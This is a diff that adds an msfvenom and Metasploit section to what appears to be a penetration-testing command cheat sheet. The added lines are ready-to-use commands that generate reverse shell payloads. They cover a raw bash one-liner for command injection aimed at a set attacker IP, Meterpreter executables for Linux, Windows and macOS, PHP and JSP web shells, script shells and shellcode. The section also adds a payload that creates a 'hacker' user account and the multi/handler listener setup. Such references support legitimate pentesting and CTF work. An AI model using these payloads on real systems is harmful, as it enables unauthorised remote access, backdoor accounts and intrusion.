@@ -36,6 +36,60 @@ Commands/tools used frequently
 *-i : Ignore  case  distinctions
 *-e : Interpret pattern as an extended regular expression
 
+# MSFVENOM
+
+## One liner
+
+```msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.103 lport=1111 R``` : One-liner raw payload, can be used in places like command injection. 
+
+## Binaries Payloads
+
+```msfvenom -l``` : List payloads
+
+```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f elf > shell.elf``` : Linux Meterpreter Reverse Shell
+
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f exe > shell.exe```: Windows Meterpreter Reverse TCP Shell
+
+```msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f macho > shell.macho``` : Mac Reverse Shell
+
+## Web Payloads
+
+PHP Meterpreter Reverse TCP
+```msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```
+```cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php```
+
+```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.jsp``` : JSP Java Meterpreter Reverse TCP
+
+## Scripting Payloads
+
+```msfvenom -p cmd/unix/reverse_python LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.py``` : Python Reverse Shell
+
+```msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh``` : Bash Unix Reverse Shell
+
+## Shellcode
+
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>``` : Windows Meterpreter Reverse TCP Shellcode
+
+```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>``` : Linux Meterpreter Reverse TCP Shellcode
+
+```msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f <language>``` : Mac Reverse TCP Shellcode
+
+## Create User
+
+```msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe``` > adduser.exe
+
+## Metasploit Handler
+use exploit/multi/handler
+
+set PAYLOAD <Payload name>
+  
+Set RHOST <Remote IP>
+  
+set LHOST <Local IP>
+  
+set LPORT <Local Port>
+  
+Run
 
 # NMAP 
 
